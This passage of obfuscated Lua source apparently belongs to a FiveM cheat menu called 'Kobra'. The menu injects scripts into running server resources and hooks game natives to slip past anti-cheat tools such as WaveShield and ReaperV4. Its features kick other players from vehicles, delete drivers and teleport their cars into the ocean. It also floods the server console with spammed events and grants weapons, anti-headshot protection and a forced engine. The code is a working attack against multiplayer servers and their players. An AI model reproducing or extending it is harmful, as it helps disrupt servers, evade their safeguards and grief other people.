                                        ]] );end else return;end v598=1371 -(618 + 751) ;end if (v598==0) then v599=GetPlayerFromServerId(v417);if (v599== -(1 + 0)) then local v978=1910 -(206 + 1704) ;while true do if (v978==(1 -0)) then v12:UpdateListMenu();return;end if (v978==(0 -0)) then v281:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",1309 + 1691 );v27[v417]=nil;v978=1;end end end v598=1276 -(155 + 1120) ;end if (v598==(1508 -(396 + 1110))) then v27[v417]=true;v281:UpdateListMenu();break;end end else v281:Notify("error","Kobra","You must select a player to do this!",3000);end end},{type="button",label="Teleport to Ocean",onSelect=function() local v418=0 + 0 ;local v419;while true do if ((1 + 0)==v418) then if v419 then local v863=0 + 0 ;local v864;while true do if ((976 -(230 + 746))==v863) then v864=GetPlayerFromServerId(v419);if (v864== -1) then local v1222=601 -(473 + 128) ;while true do if (v1222==(48 -(39 + 9))) then v281:Notify("error","Kobra","There was an error while trying to tp the vehicle to the ocean! (ERR:1)",3266 -(38 + 228) );v27[v419]=nil;v1222=1 -0 ;end if (v1222==(474 -(106 + 367))) then v12:UpdateListMenu();return;end end end v863=1 + 0 ;end if (v863==2) then v27[v419]=true;v281:UpdateListMenu();break;end if (v863==1) then if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v864))) then local v1223=1862 -(354 + 1508) ;while true do if (v1223==0) then v281:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",9628 -6628 );return;end end end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v1303=1 + 0 ,2 + 0  do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v864))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v863=2 -0 ;end end else v281:Notify("error","Kobra","You must select a player to do this!",4244 -(334 + 910) );end break;end if ((895 -(92 + 803))==v418) then v419=nil;for v804,v805 in pairs(v27) do if v805 then v419=v804;break;end end v418=1 + 0 ;end end end}}},{label="Triggers",tabs={{type="checkbox",label="Server Console Spam",checked=false,onSelect=function(v420) if v420 then local v600=0 + 0 ;while true do if (0==v600) then print("Console Spam Started...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    if not _G.KobraServerConsoleSpamInitialized then
                                        _G.KobraServerConsoleSpamEnabled = true
                                        _G.KobraServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.Kobra then
                                            _G.Kobra = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.KobraServerConsoleSpamInitialized do
                                                if not _G.KobraServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.Kobra.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.KobraServerConsoleSpamEnabled = true
                                    end
                                ]]);break;end end else print("Console Spam Stopped...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    _G.KobraServerConsoleSpamEnabled = false
                                ]]);end end}}}}},{icon="",label="Weapon",type="subMenu",categories={{label="Spawner",tabs={{type="button",label="Give Weapon",onSelect=function() v59("Weapon Name","WEAPON_",function(v558) if (v558 and (v558~="")) then v281:SpawnSelectedWeapon(v558);end end,"typeable");end},{type="button",label="Give All Weapons",onSelect=function() v281:GiveAllWeapons();end},{type="button",label="Remove All Weapons",onSelect=function() v281:RemoveAllWeapons();end},{type="divider",label="All Weapons"},{type="scrollable",label="Melee",scrollType="onEnter",value=1 + 0 ,values=v281:BuildMenuFromWeaponList({"weapon_unarmed","weapon_knife","weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench"}),onSelect=function(v421) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v421));end},{type="scrollable",label="Handguns",scrollType="onEnter",value=1,values=v281:BuildMenuFromWeaponList({"weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun"}),onSelect=function(v422) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v422));end},{type="scrollable",label="SMGs",scrollType="onEnter",value=1977 -(286 + 1690) ,values=v281:BuildMenuFromWeaponList({"weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_machinepistol","weapon_minismg","weapon_combatpdw"}),onSelect=function(v423) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v423));end},{type="scrollable",label="Rifles",scrollType="onEnter",value=508 -(263 + 244) ,values=v281:BuildMenuFromWeaponList({"weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_bullpuprifle","weapon_gusenberg","weapon_compactrifle","weapon_bullpuprifle_mk2","weapon_marksmanrifle"}),onSelect=function(v424) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v424));end},{type="scrollable",label="Shotguns",scrollType="onEnter",value=1912 -(1680 + 231) ,values=v281:BuildMenuFromWeaponList({"weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_heavyshotgun","weapon_autoshotgun"}),onSelect=function(v425) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v425));end},{type="scrollable",label="Snipers",scrollType="onEnter",value=28 -(18 + 9) ,values=v281:BuildMenuFromWeaponList({"weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2"}),onSelect=function(v426) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v426));end},{type="scrollable",label="Explosives",scrollType="onEnter",value=1 -0 ,values=v281:BuildMenuFromWeaponList({"weapon_grenade","weapon_stickybomb","weapon_molotov","weapon_pipebomb","weapon_proxmine","weapon_rpg","weapon_grenadelauncher","weapon_rpg","weapon_minigun","weapon_firework"}),onSelect=function(v427) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v427));end},{type="scrollable",label="Heavy",scrollType="onEnter",value=1 + 0 ,values=v281:BuildMenuFromWeaponList({"weapon_mg","weapon_combatmg","weapon_gusenberg","weapon_minigun","weapon_grenadelauncher","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher"}),onSelect=function(v428) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v428));end},{type="scrollable",label="Throwables",scrollType="onEnter",value=1 + 0 ,values=v281:BuildMenuFromWeaponList({"weapon_ball","weapon_flare","weapon_smokegrenade","weapon_bzgas","weapon_petrolcan"}),onSelect=function(v429) v281:SpawnSelectedWeapon(v281:GetWeaponModelFromLabel(v429));end}}},{label="Combat",tabs={{type="button",label="Test Button",onSelect=function() print("hi");end},{type="checkbox",label="Infinite Ammo ",desc="Infinite Ammo, this might be detected on certain servers",checked=false,onSelect=function(v430) if v430 then v281:Notify("success","Kobra","Enabled Infinite Ammo",5000);v281:EnableInfiniteAmmo();else local v601=0 -0 ;while true do if (v601==0) then v281:Notify("error","Kobra","Disabled Infinite Ammo",5000);v281:DisableInfiniteAmmo();break;end end end end},{type="checkbox",label="Anti-Headshot",checked=false,desc="This will prevent you from being headshot.",onSelect=function(v431) if v431 then local v602=0;while true do if ((0 + 0)==v602) then v281:Notify("success","Kobra","Enabled Anti-Headshot",5000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]]);end break;end end else v281:Notify("error","Kobra","Disabled Anti-Headshot",5000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]]);else v48("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]]);end end end}}}}},{icon="",label="Vehicle",type="subMenu",categories={{label="Spawner",tabs={{type="checkbox",label="Teleport Into",desc="If selected, this will teleport you into the selected vehicle.",checked=false,onSelect=function(v432) v43=v432 or false ;end},{type="checkbox",label="Delete Previous",desc="If selected, this will delete your previous vehicle when spawning selected vehicle.",checked=false,onSelect=function(v433) v42=v433 or false ;end},{type="divider",label="All Vehicles"},{type="button",label="Addon",onSelect=function() v59("Addon Vehicle","",function(v559) if (v559 and (v559~="")) then v281:SpawnSelectedVehicle(v559,v43,v42);end end,"typeable");end},{icon="ph ph-car",label="Compacts",type="scrollable",scrollType="onEnter",value=1,values={"asbo","blista","brioso","brioso2","brioso3","club","dilettante","dilettante2","issi2","issi3","issi4","issi5","issi6","kanjo","panto","prairie","rhapsody","weevil"},onSelect=function(v434) v281:SpawnSelectedVehicle(v434,v43,v42);end},{icon="ph ph-car",label="Sedans",type="scrollable",scrollType="onEnter",value=3 -2 ,values={"asea","asea2","asterope","asterope2","cinquemila","driftchavosv6","cog55","cog552","cognoscenti","cognoscenti2","deity","hardy","drifthardy","emperor","emperor2","emperor3","fugitive","glendale","glendale2","impaler5","ingot","intruder","minimus","limo2","premier","primo","primo2","regina","rhinehart","romero","schafter2","schafter5","schafter6","stafford","stanier","stratum","stretch","superd","surge","tailgater","tailgater2","warrener","warrener2","washington"},onSelect=function(v435) v281:SpawnSelectedVehicle(v435,v43,v42);end},{icon="ph ph-car",label="SUVs",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"aleutian","astron","baller","baller2","baller3","baller4","baller5","baller6","baller7","baller8","bjxl","cavalcade","cavalcade2","cavalcade3","contender","dorado","dubsta","dubsta2","everon3","fq2","granger","granger2","gresley","habanero","huntley","issi8","iwagen","jubilee","landstalker","landstalker2","mesa","mesa2","novak","patriot","patriot2","radi","rebla","rocoto","seminole","seminole2","serrano","squaddie","toros","vivanite","woodlander","xls","xls2"},onSelect=function(v436) v281:SpawnSelectedVehicle(v436,v43,v42);end},{icon="ph ph-car",label="Coupes",type="scrollable",scrollType="onEnter",value=3 -2 ,values={"cogcabrio","driftfr36","exemplar","f620","felon","felon2","fr36","jackal","kanjosj","oracle","oracle2","postlude","previon","sentinel","sentinel2","windsor","windsor2","zion","zion2"},onSelect=function(v437) v281:SpawnSelectedVehicle(v437,v43,v42);end},{icon="ph ph-car",label="Muscles",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"blade","brigham","broadway","buccaneer","buccaneer2","buffalo4","buffalo5","chino","chino2","clique","clique2","coquette3","deviant","dominator","dominator2","dominator3","dominator4","dominator5","dominator6","dominator7","dominator8","dominator9","driftdominator10","driftyosemite","dukes","dukes2","dukes3","ellie","eudora","faction","faction2","faction3","gauntlet","gauntlet2","gauntlet3","gauntlet4","gauntlet5","driftgauntlet4","greenwood","hermes","hotknife","hustler","impaler","impaler2","impaler3","impaler4","impaler6","imperator","imperator2","imperator3","lurcher","manana2","moonbeam","moonbeam2","nightshade","peyote2","phoenix","picador","ratloader","ratloader2","ruiner","ruiner2","ruiner3","ruiner4","sabregt","sabregt2","slamvan","slamvan2","slamvan3","slamvan4","slamvan5","slamvan6","stalion","stalion2","tahoma","tampa","tampa3","tampa4","tulip","tulip2","vamos","vigero","vigero2","vigero3","virgo","virgo2","virgo3","voodoo","voodoo2","weevil2","yosemite","yosemite2"},onSelect=function(v438) v281:SpawnSelectedVehicle(v438,v43,v42);end},{icon="ph ph-car",label="Sports Classic",type="scrollable",scrollType="onEnter",value=1623 -(653 + 969) ,values={"ardent","btype","btype2","btype3","casco","cheburek","cheetah2","cheetah3","coquette2","deluxo","dynasty","fagaloa","feltzer3","gt500","infernus2","jb700","jb7002","mamba","manana","michelli","monroe","nebula","peyote","peyote3","pigalle","rapidgt3","retinue","retinue2","savestra","stinger","stingergt","stromberg","swinger","toreador","torero","tornado","tornado2","tornado3","tornado4","tornado5","tornado6","turismo2","viseris","z190","zion3","ztype"},onSelect=function(v439) v281:SpawnSelectedVehicle(v439,v43,v42);end},{icon="ph ph-car",label="Sports",type="scrollable",value=1 + 0 ,values={"alpha","banshee","bestiagts","blista2","blista3","buffalo","buffalo2","buffalo3","calico","carbonizzare","comet2","comet3","comet4","comet5","comet6","comet7","coquette","coquette4","corsita","coureur","cypher","drafter","drifteuros","driftfuto","driftjester","driftremus","drifttampa","driftzr350","elegy","elegy2","euros","everon2","feltzer2","flashgt","furoregt","fusilade","futo","futo2","gauntlet6","gb200","growler","hotring","imorgon","issi7","italigto","italirsx","jester","jester2","jester3","jester4","jugular","khamelion","komoda","kuruma","kuruma2","locust","lynx","massacro","massacro2","neo","neon","ninef","ninef2","omnis","omnisegt","panthere","paragon","paragon2","pariah","penumbra","penumbra2","r300","raiden","rapidgt","rapidgt2","rapidgt4","raptor","remus","revolter","rt3000","ruston","schafter3","schafter4","schlagen","schwarzer","sentinel3","sentinel4","sentinel5","seven70","sm722","specter","specter2","stingertt","streiter","sugoi","sultan","sultan2","sultan3","surano","tampa2","tenf","tenf2","tropos","vectre","verlierer2","veto","veto2","vstr","zr350","zr380","zr3802","zr3803"},onSelect=function(v440) v281:SpawnSelectedVehicle(v440,v43,v42);end},{icon="ph ph-car",label="Super",type="scrollable",scrollType="onEnter",value=315 -(249 + 65) ,values={"adder","autarch","banshee2","bullet","champion","cheetah","cyclone","deveste","emerus","entity2","entity3","entityxf","fmj","furia","gp1","ignus","infernus","italigtb","italigtb2","krieger","le7b","lm87","nero","nero2","osiris","penetrator","pfister811","prototipo","reaper","s80","sc1","scramjet","sheava","sultanrs","suzume","t20","taipan","tempesta","tezeract","thrax","tigon","torero2","turismo3","turismor","tyrant","tyrus","vacca","vagner","vigilante","virtue","visione","voltic","voltic2","xa21","zeno","zentorno","zorrusso"},onSelect=function(v441) v281:SpawnSelectedVehicle(v441,v43,v42);end},{icon="ph ph-car",label="Motorcycles",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"akuma","avarus","bagger","bati","bati2","bf400","carbonrs","chimera","cliffhanger","daemon","daemon2","deathbike","deathbike2","deathbike3","defiler","diablous","diablous2","double","enduro","esskey","faggio","faggio2","faggio3","fcr","fcr2","gargoyle","hakuchou","hakuchou2","hexer","innovation","lectro","manchez","manchez2","manchez3","nemesis","nightblade","oppressor","oppressor2","pcj","powersurge","ratbike","reever","rrocket","ruffian","sanchez","sanchez2","sanctus","shinobi","shotaro","sovereign","stryder","thrust","vader","vindicator","vortex","wolfsbane","zombiea","zombieb"},onSelect=function(v442) v281:SpawnSelectedVehicle(v442,v43,v42);end},{icon="ph ph-car",label="Off-Road",type="scrollable",scrollType="onEnter",value=1,values={"bfinjection","bifta","blazer","blazer2","blazer3","blazer4","blazer5","bodhi2","boor","brawler","bruiser","bruiser2","bruiser3","brutus","brutus2","brutus3","caracara","caracara2","dloader","draugur","driftl352","dubsta3","dune","dune2","dune3","dune4","dune5","freecrawler","hellion","insurgent","insurgent2","insurgent3","kalahari","kamacho","l35","l352","marshall","menacer","mesa3","monster","monster3","monster4","monster5","monstrociti","nightshark","outlaw","patriot3","rancherxl","rancherxl2","ratel","rcbandito","rebel","rebel2","riata","sandking","sandking2","technical","technical2","technical3","terminus","trophytruck","trophytruck2","vagrant","verus","winky","yosemite3","zhaba"},onSelect=function(v443) v281:SpawnSelectedVehicle(v443,v43,v42);end},{icon="ph ph-car",label="Industrial",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"bulldozer","cutter","dump","flatbed","flatbed2","guardian","handler","mixer","mixer2","rubble","tiptruck","tiptruck2"},onSelect=function(v444) v281:SpawnSelectedVehicle(v444,v43,v42);end},{icon="ph ph-car",label="Utility",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"airtug","armytanker","armytrailer","armytrailer2","baletrailer","boattrailer","boattrailer2","boattrailer3","caddy","caddy2","caddy3","docktrailer","docktug","forklift","freighttrailer","graintrailer","mower","proptrailer","raketrailer","ripley","sadler","sadler2","scrap","slamtruck","tanker","tanker2","towtruck","towtruck2","towtruck3","towtruck4","tr2","tr3","tr4","tractor","tractor2","tractor3","trailerlarge","trailerlogs","trailers","trailers2","trailers3","trailers4","trailers5","trailersmall","trflat","tvtrailer","tvtrailer2","utillitruck","utillitruck2","utillitruck3"},onSelect=function(v445) v281:SpawnSelectedVehicle(v445,v43,v42);end},{icon="ph ph-car",label="Vans",type="scrollable",scrollType="onEnter",value=1,values={"bison","bison2","bison3","bobcatxl","boxville","boxville2","boxville3","boxville4","boxville5","boxville6","burrito","burrito2","burrito3","burrito4","burrito5","camper","gburrito","gburrito2","journey","journey2","minivan","minivan2","paradise","pony","pony2","rumpo","rumpo2","rumpo3","speedo","speedo2","speedo4","speedo5","surfer","surfer2","surfer3","taco","youga","youga2","youga3","youga4"},onSelect=function(v446) v281:SpawnSelectedVehicle(v446,v43,v42);end}}},{label="Vehicle Customization",tabs={{type="button",label="Set License Plate",onSelect=function() v59("Set License Plate","",function(v560) if (v560 and (v560~="")) then local v722=string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]],v560);MachoInjectResourceRaw("any",v722);else v12:Notify("Invalid input","Please enter a valid license plate.","error");end end,"typeable");end},{type="button",label="Repair Vehicle",onSelect=function() v281:RepairVehicle();end},{type="button",label="Clean Vehicle",onSelect=function() local v447=0;while true do if (v447==0) then v12:Notify("success","Kobra","Cleaned Vehicle",6289 -3289 );MachoInjectResourceRaw("any",[[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]]);break;end end end},{type="button",label="Force Vehicle Engine",onSelect=function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]]);end,function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
